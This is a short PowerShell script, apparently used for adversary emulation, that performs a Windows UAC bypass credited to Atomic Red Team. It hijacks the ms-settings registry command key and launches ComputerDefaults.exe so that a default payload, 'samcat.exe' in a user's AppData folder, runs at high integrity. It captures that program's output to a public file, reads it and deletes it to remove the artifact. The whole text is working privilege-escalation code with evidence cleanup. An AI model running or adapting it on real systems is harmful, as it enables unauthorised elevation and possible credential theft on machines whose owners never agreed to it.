<#
    this script leverages a UAC bypass method (Atomic test 5) documented in Atomic Red Team
	Resource: https://github.com/redcanaryco/atomic-red-team/blob/28086402e20d7f06cd27545ccb90df672c303510/atomics/T1548.002/T1548.002.md
#>
# Example: .\uac-bypass-2.ps1 -exe process-to-run-as-high-integrity -out FILE to write to
param (
	$out="rdf31337.txt",
	$exe="powershell.exe -c C:\Users\kmitnick.hospitality\AppData\Local\samcat.exe > C:\Users\Public\$out"
)

# Set reg key with desired executable to run with high-integrity
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value $exe -Force

# Spawn target-process
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
Start-Sleep 10
get-content C:\Users\Public\$out;
rm C:\Users\Public\$out; # Remove artifact from disk